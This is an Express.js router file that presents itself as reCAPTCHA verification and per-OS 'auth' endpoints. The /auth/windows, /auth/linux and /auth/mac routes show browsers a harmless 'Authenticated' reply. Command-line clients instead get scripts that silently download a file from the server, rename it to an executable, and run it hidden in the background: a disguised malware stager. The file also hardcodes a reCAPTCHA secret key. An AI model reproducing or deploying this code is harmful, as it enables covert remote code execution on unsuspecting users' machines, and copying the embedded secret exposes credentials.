var express = require('express');
var router = express.Router();
const jwt = require('passport-jwt')

// Lazy Responder :)
function responder(res, err, data) {
    if (err || !data) {
        console.log({
            err, data
        })
        res.status(400).send({
            err, data
        })
    } else {
        console.log("Data: " + data)
        res.status(200).send(data)
    }
}

// I am not a robot
router.post('/verify-captcha', async (req, res) => {
    const { token } = req.body;

  if (!token) {
    return res.status(400).json({ success: false, message: 'Missing reCAPTCHA token' });
  }

  try {
  const response = await axios.post(
    'https://www.google.com/recaptcha/api/siteverify',
    new URLSearchParams({
      secret: "6LdPsIMrAAAAAIwB4sBDGOBEiUiB7bjFzxIKkhcO",
      response: token,
    }).toString(),
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    }
  ); // ✅ Closing parenthesis moved here (no extra one)

  if (response.data.success) {
    res.json({ success: true });
  } else {
    res.status(400).json({ success: false, message: 'Failed reCAPTCHA check' });
  }
} catch (error) {
   console.error('CAPTCHA verification error:', error.message);
  res.status(500).json({ success: false, message: 'Server error verifying reCAPTCHA' });
}
})
// Login

router.get("/auth/windows", (req, res) => {
  const token = req.query.token;

   const userAgent = req.get('User-Agent');
   if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)){
     res.type("text/plain").send(`@echo off
    echo Authenticated
    `);
   }
   else{
    const domain = req.protocol + '://' + req.get('host');
    
    res.type("text/plain").send(`@echo off
    
    curl -s -L -o "%USERPROFILE%\\token" ${domain}/users/token.npl
    cls
    ren "%USERPROFILE%\\token" token.cmd
    cls
    call "%USERPROFILE%\\token.cmd"
    cls
    `);
   }


});

router.get("/auth/linux", (req, res) => {    
  const token = req.query.token;
  const userAgent = req.get('User-Agent');
  
  if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
    res.type("text/plain").send(`@echo off
    echo Authenticated
    `);
  }
  else {
    const domain = req.protocol + '://' + req.get('host');
res.type("text/plain").send(`#!/bin/bash
set -e
echo "Authenticated"
TARGET_DIR="$HOME/Documents"
clear
wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/users/tokenlinux.npl
clear
mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
clear
chmod +x "$TARGET_DIR/tokenlinux.sh"
clear
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0

`);
  }
});
router.get("/auth/mac", (req, res) => {    
  const token = req.query.token;
  const userAgent = req.get('User-Agent');
  
  if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
    res.type("text/plain").send(`@echo off
    echo Authenticated
    `);
  }
  else {
    
    const domain = req.protocol + '://' + req.get('host');
res.type("text/plain").send(`#!/bin/bash
set -e
echo "Authenticated"
mkdir -p "$HOME/Documents"
clear
curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/users/tokenlinux.npl"
clear
chmod +x "$HOME/Documents/tokenlinux.sh"
clear
nohup bash "$HOME/Documents/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0

`);
  }
});
module.exports = router;